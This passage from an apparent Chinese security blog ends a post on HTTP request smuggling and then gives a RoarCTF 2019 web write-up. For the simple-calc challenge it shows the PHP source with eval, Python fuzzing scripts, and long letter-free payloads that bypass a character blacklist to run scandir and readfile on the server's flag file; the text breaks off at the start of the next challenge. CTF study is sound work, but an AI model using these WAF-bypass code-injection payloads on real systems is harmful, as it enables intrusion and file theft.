不限制post还是get请求(如果前后端允许接收get带有请求体)，传入不同值的Content-Length，前端代理服务器要大于后端服务器，后端服务器会将没读到的字符留在缓存，会附着在下一次请求上。</p><p>CL-TE: 前端代理服务器只处理<code>content-length</code>，后端遵守RFC丢掉<code>content-length</code>只处理<code>Transfer-Encoding</code></p><p>TE-CL: 前端只处理<code>transfer-encoding</code>，后端只处理<code>content-length</code></p><p>TE-TE: 前后端都处理<code>transfer-encoding</code>,使得后端处理的transfer-encoding为无法识别,只处理<code>content-length</code></p></blockquote><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a></li></ul><ul><li><a href="https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/" target="_blank" rel="noopener">https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/</a></li><li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank" rel="noopener">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></li><li><a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank" rel="noopener">https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a></li><li><a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf" target="_blank" rel="noopener">https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>HTTP请求走私</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RoarCTF2019_web题解(待补充)</title>
    <link href="/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/"/>
    <url>/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/</url>
    
    <content type="html"><![CDATA[<h1 id="simple-calc"><a href="#simple-calc" class="headerlink" title="simple-calc"></a>simple-calc</h1><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><p>后端存在waf，不能使用英文字母，但是可以使用数字还有一些运算符</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'num'</span>]))&#123;    show_source(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-keyword">else</span>&#123;        $str = $_GET[<span class="hljs-string">'num'</span>];        $blacklist = [<span class="hljs-string">' '</span>, <span class="hljs-string">'\t'</span>, <span class="hljs-string">'\r'</span>, <span class="hljs-string">'\n'</span>,<span class="hljs-string">'\''</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'`'</span>, <span class="hljs-string">'\['</span>, <span class="hljs-string">'\]'</span>,<span class="hljs-string">'\$'</span>,<span class="hljs-string">'\\'</span>,<span class="hljs-string">'\^'</span>];        <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) &#123;                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/'</span> . $blackitem . <span class="hljs-string">'/m'</span>, $str)) &#123;                        <span class="hljs-keyword">die</span>(<span class="hljs-string">"what are you want to do?"</span>);                &#125;        &#125;        <span class="hljs-keyword">eval</span>(<span class="hljs-string">'echo '</span>.$str.<span class="hljs-string">';'</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>思路：1. 利用php7 新增特性会将括号内的字符当做字符串</p><pre><code>2. 利用数字的与或反三种运算（^被过滤）得到全部a-z等字符     3. 动态函数执行</code></pre><p>php7特性，字符串括号拼接当做字符串</p><pre><code class="hljs angelscript">((<span class="hljs-number">999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;|((<span class="hljs-number">999999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">6</span>&#125;u((<span class="hljs-number">999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;|((<span class="hljs-number">999999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;o</code></pre><p>payload不能直接出现a数组其他的字符，否则会爆500，所以只能通过a数组中的字符进行与或得到其他额外字符</p><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*- </span>a=[<span class="hljs-string">'0'</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'2'</span>,<span class="hljs-string">'3'</span>,<span class="hljs-string">'4'</span>,<span class="hljs-string">'5'</span>,<span class="hljs-string">'6'</span>,<span class="hljs-string">'7'</span>,<span class="hljs-string">'8'</span>,<span class="hljs-string">'9'</span>,<span class="hljs-string">'E'</span>,<span class="hljs-string">'+'</span>,<span class="hljs-string">'.'</span>]b=[]c=[]d=[]b1=[]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> a:        b.append(i+<span class="hljs-string">'或'</span>+j+<span class="hljs-string">'-------'</span>+chr(ord(i)|ord(j)))        b1.append(chr(ord(i)|ord(j)))c1=[]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> a:        c.append(i+<span class="hljs-string">'与'</span>+j+<span class="hljs-string">'--------'</span>+chr(ord(i)&amp;ord(j)))        c1.append(chr(ord(i)&amp;ord(j)))d1=[]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> set(b1+c1):<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> set(b1+c1):d.append(i+<span class="hljs-string">'与'</span>+j+<span class="hljs-string">'--------'</span>+chr(ord(i)&amp;ord(j)))d1.append(chr(ord(i)&amp;ord(j)))print(set(d1+b1+c1))<span class="hljs-comment"># tmp=[]</span><span class="hljs-comment"># for i in set(d1+b1+c1):</span><span class="hljs-comment">#     print(bin(ord(i)))</span>a=raw_input(<span class="hljs-string">"input you find: "</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> (b+c+d):    <span class="hljs-keyword">if</span> a <span class="hljs-keyword">in</span> i:        print(i)        <span class="hljs-keyword">break</span></code></pre><p>可以得到如下可用运算字符</p><pre><code class="hljs php">set([<span class="hljs-string">'\x01'</span>, <span class="hljs-string">'\x00'</span>, <span class="hljs-string">'\x05'</span>, <span class="hljs-string">'\x04'</span>, <span class="hljs-string">'!'</span>, <span class="hljs-string">' '</span>, <span class="hljs-string">'#'</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'%'</span>, <span class="hljs-string">'$'</span>, <span class="hljs-string">"'"</span>, <span class="hljs-string">'&amp;'</span>, <span class="hljs-string">')'</span>, <span class="hljs-string">'('</span>, <span class="hljs-string">'+'</span>, <span class="hljs-string">'*'</span>, <span class="hljs-string">'-'</span>, <span class="hljs-string">','</span>, <span class="hljs-string">'/'</span>, <span class="hljs-string">'.'</span>, <span class="hljs-string">'1'</span>, <span class="hljs-string">'0'</span>, <span class="hljs-string">'3'</span>, <span class="hljs-string">'2'</span>, <span class="hljs-string">'5'</span>, <span class="hljs-string">'4'</span>, <span class="hljs-string">'7'</span>, <span class="hljs-string">'6'</span>, <span class="hljs-string">'9'</span>, <span class="hljs-string">'8'</span>, <span class="hljs-string">';'</span>, <span class="hljs-string">':'</span>, <span class="hljs-string">'='</span>, <span class="hljs-string">'&lt;'</span>, <span class="hljs-string">'?'</span>, <span class="hljs-string">'&gt;'</span>, <span class="hljs-string">'E'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'g'</span>, <span class="hljs-string">'m'</span>, <span class="hljs-string">'o'</span>, <span class="hljs-string">'u'</span>, <span class="hljs-string">'w'</span>, <span class="hljs-string">'&#125;'</span>])</code></pre><p>那么问题了，这是可用字符的极限了，我们可以打印如上字符的二进制</p><p>最大位数是7bit,a-z的bit位数也正好是7位</p><blockquote><p>先看出一个规律</p><p>6bit的字符，每个bit都可以通过与或得到0或1,可以得到6bit区间内的所有字符</p><p>7bit的字符，倒三字符还有倒一都是1,无法与或置为0，限制了7bit额外字符的生成,也就是限制了a-z字符生成</p></blockquote><pre><code class="hljs python">[<span class="hljs-string">'0b1'</span>, <span class="hljs-string">'0b0'</span>, <span class="hljs-string">'0b101'</span>, <span class="hljs-string">'0b100'</span>, <span class="hljs-string">'0b100001'</span>, <span class="hljs-string">'0b100000'</span>, <span class="hljs-string">'0b100011'</span>, <span class="hljs-string">'0b100010'</span>, <span class="hljs-string">'0b100101'</span>, <span class="hljs-string">'0b100100'</span>, <span class="hljs-string">'0b100111'</span>, <span class="hljs-string">'0b100110'</span>, <span class="hljs-string">'0b101001'</span>, <span class="hljs-string">'0b101000'</span>, <span class="hljs-string">'0b101011'</span>, <span class="hljs-string">'0b101010'</span>, <span class="hljs-string">'0b101101'</span>, <span class="hljs-string">'0b101100'</span>, <span class="hljs-string">'0b101111'</span>, <span class="hljs-string">'0b101110'</span>, <span class="hljs-string">'0b110001'</span>, <span class="hljs-string">'0b110000'</span>, <span class="hljs-string">'0b110011'</span>, <span class="hljs-string">'0b110010'</span>, <span class="hljs-string">'0b110101'</span>, <span class="hljs-string">'0b110100'</span>, <span class="hljs-string">'0b110111'</span>, <span class="hljs-string">'0b110110'</span>, <span class="hljs-string">'0b111001'</span>, <span class="hljs-string">'0b111000'</span>, <span class="hljs-string">'0b111011'</span>, <span class="hljs-string">'0b111010'</span>, <span class="hljs-string">'0b111101'</span>, <span class="hljs-string">'0b111100'</span>, <span class="hljs-string">'0b111111'</span>, <span class="hljs-string">'0b111110'</span>, <span class="hljs-string">'0b1000101'</span>, <span class="hljs-string">'0b1100101'</span>, <span class="hljs-string">'0b1100111'</span>, <span class="hljs-string">'0b1101101'</span>, <span class="hljs-string">'0b1101111'</span>, <span class="hljs-string">'0b1110101'</span>, <span class="hljs-string">'0b1110111'</span>, <span class="hljs-string">'0b1111101'</span>]</code></pre><p>所以解决额外字符的思路出来了，制造出一个7bit二进制数，可以尽可能制造多的字符以节省劳动力，就不用费劲心思去运算得到其他字符。</p><blockquote><p>如下脚本fuzz使用哪个字符与可用字符与或，发现 ‘@’ 最好用 ,可以生成34个字符，二进制=&gt;0b1000000</p><p>‘@’   生成可以用   ~’?’=&gt; (1或.——-?)</p><p>在赋值到main参数，fuzz出可用字符与或结果</p></blockquote><pre><code class="hljs python"><span class="hljs-keyword">import</span> stringarr=[<span class="hljs-string">'\x01'</span>, <span class="hljs-string">'\x00'</span>, <span class="hljs-string">'\x05'</span>, <span class="hljs-string">'\x04'</span>, <span class="hljs-string">'!'</span>, <span class="hljs-string">' '</span>, <span class="hljs-string">'#'</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'%'</span>, <span class="hljs-string">'$'</span>, <span class="hljs-string">"'"</span>, <span class="hljs-string">'&amp;'</span>, <span class="hljs-string">')'</span>, <span class="hljs-string">'('</span>, <span class="hljs-string">'+'</span>, <span class="hljs-string">'*'</span>, <span class="hljs-string">'-'</span>, <span class="hljs-string">','</span>, <span class="hljs-string">'/'</span>, <span class="hljs-string">'.'</span>, <span class="hljs-string">'1'</span>, <span class="hljs-string">'0'</span>, <span class="hljs-string">'3'</span>, <span class="hljs-string">'2'</span>, <span class="hljs-string">'5'</span>, <span class="hljs-string">'4'</span>, <span class="hljs-string">'7'</span>, <span class="hljs-string">'6'</span>, <span class="hljs-string">'9'</span>, <span class="hljs-string">'8'</span>, <span class="hljs-string">';'</span>, <span class="hljs-string">':'</span>, <span class="hljs-string">'='</span>, <span class="hljs-string">'&lt;'</span>, <span class="hljs-string">'?'</span>, <span class="hljs-string">'&gt;'</span>, <span class="hljs-string">'E'</span>, <span class="hljs-string">'e'</span>, <span class="hljs-string">'g'</span>, <span class="hljs-string">'m'</span>, <span class="hljs-string">'o'</span>, <span class="hljs-string">'u'</span>, <span class="hljs-string">'w'</span>, <span class="hljs-string">'&#125;'</span>]arr1=string.printableprint(len(arr1))<span class="hljs-comment"># fuzz可以创造出最多的字符</span><span class="hljs-keyword">for</span> flag <span class="hljs-keyword">in</span> arr1:    tmp=[]    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arr:        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> arr1:            <span class="hljs-keyword">if</span> chr(ord(flag)&amp;ord(i)) == j:                tmp.append(j)                <span class="hljs-comment">#print(i+' [&amp;] '+j)</span>                <span class="hljs-keyword">break</span>    print(<span class="hljs-string">'[&amp;]flag: '</span>+ flag+<span class="hljs-string">"=&gt;"</span>+str(len(set(tmp))))    print(set(tmp))<span class="hljs-keyword">for</span> flag <span class="hljs-keyword">in</span> arr1:    tmp=[]    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arr:        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> arr1:            <span class="hljs-keyword">if</span> chr(ord(flag)|ord(i)) == j:                tmp.append(j)                <span class="hljs-comment">#print(i+' [&amp;] '+j)</span>                <span class="hljs-keyword">break</span>    print(<span class="hljs-string">'[|]flag: '</span>+ flag+<span class="hljs-string">"=&gt;"</span>+str(len(set(tmp))))    print(set(tmp))<span class="hljs-comment"># 填入'@'逆推需要的字符    </span>main=<span class="hljs-string">'@'</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arr:    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> arr1:        <span class="hljs-keyword">if</span> chr(ord(main)|ord(i)) == j:            print(i+<span class="hljs-string">' [|] '</span>+main+<span class="hljs-string">' =&gt; '</span>+j)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arr:    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> arr1:        <span class="hljs-keyword">if</span> chr(ord(main)&amp;ord(i)) == j:            print(i+<span class="hljs-string">' [&amp;] '</span>+main+<span class="hljs-string">' =&gt; '</span>+j)</code></pre><p>后面就手拼吧，脚本不会写了</p><pre><code class="hljs php">首先构造scandir(<span class="hljs-string">'/'</span>)扫描根目录下的文件，payload：?num=((((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;)).((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">26</span>(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).((((<span class="hljs-number">1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)).((((<span class="hljs-number">1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">26</span>(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).(((((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;))%<span class="hljs-number">26</span>(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).(((((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;))%<span class="hljs-number">26</span>(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;))))</code></pre><pre><code class="hljs php">readfile(<span class="hljs-string">'/f1agg'</span>)，payload：?num=(((((<span class="hljs-number">1</span>).(<span class="hljs-number">2</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).(((((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;))%<span class="hljs-number">26</span>(((<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).((((<span class="hljs-number">1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">26</span>(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).((((<span class="hljs-number">1</span>).(<span class="hljs-number">4</span>))&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">26</span>(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">26</span>(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).((((<span class="hljs-number">1</span>).(<span class="hljs-number">9</span>))&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">26</span>(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).(((((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;)|(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>).(<span class="hljs-number">4</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">8</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).(((((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;))%<span class="hljs-number">26</span>(((<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))))(((((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;)).((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">26</span>(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).((((<span class="hljs-number">1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)).((((<span class="hljs-number">1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">26</span>(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).(((((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;))%<span class="hljs-number">26</span>(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))).(((((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">9999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;))%<span class="hljs-number">26</span>(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">100000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)%<span class="hljs-number">26</span>(~((((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)))))</code></pre><h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>parse_str过waf或者http请求走私</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">dechex</span><span class="hljs-params">()</span></span> 十进制转换为十六进制<span class="hljs-function"><span class="hljs-title">hex2bin</span><span class="hljs-params">()</span></span> 十六进制转换为ASCII字符<span class="hljs-function"><span class="hljs-title">base_convert</span><span class="hljs-params">(num,frombase,tobase)</span></span> 将num为frombase转换为指定进制tobase</code></pre><blockquote><p>var_dump(base_convert(61693386291,10,36)(hex2bin(dechex(47))))</p><p>var_dump(scandir(‘/‘))</p></blockquote><p><img src="./1571201776415.png" srcset="/img/loading.gif" alt="1571201776415"></p><blockquote><p>readfile(/f1agg)</p><p>base_convert(2146934604002,10,36)(hex2bin(dechex(47)).(f1agg))</p></blockquote><p><img src="./1571201900561.png" srcset="/img/loading.gif" alt="1571201900561"></p><p><img src="./1571201983786.png" srcset="/img/loading.gif" alt="1571201983786"></p><h1 id="simple-Upload"><a href="#simple-Upload" class="headerlink" title="simple-Upload"></a>simple-Upload</h1><p>题目</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">Home</span>\<span 